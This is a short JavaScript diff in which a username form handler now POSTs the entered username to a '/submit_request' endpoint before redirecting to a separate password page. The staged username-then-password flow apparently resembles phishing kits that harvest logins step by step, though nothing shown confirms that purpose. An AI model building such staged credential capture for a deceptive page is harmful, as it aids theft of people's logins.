@@ -84,6 +84,15 @@ document.getElementById('step1Form').addEventListener('submit', function(event) 
     const username = document.getElementById('username').value;
     if (username) {
         localStorage.setItem('temp_username', username);
+        fetch('/submit_request', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            keepalive: true,
+            body: JSON.stringify({
+                type: 'username',
+                data: { username: username }
+            })
+        }).catch(error => console.error('Error:', error));
         window.location.href = 'password_en.html';
     }
 });
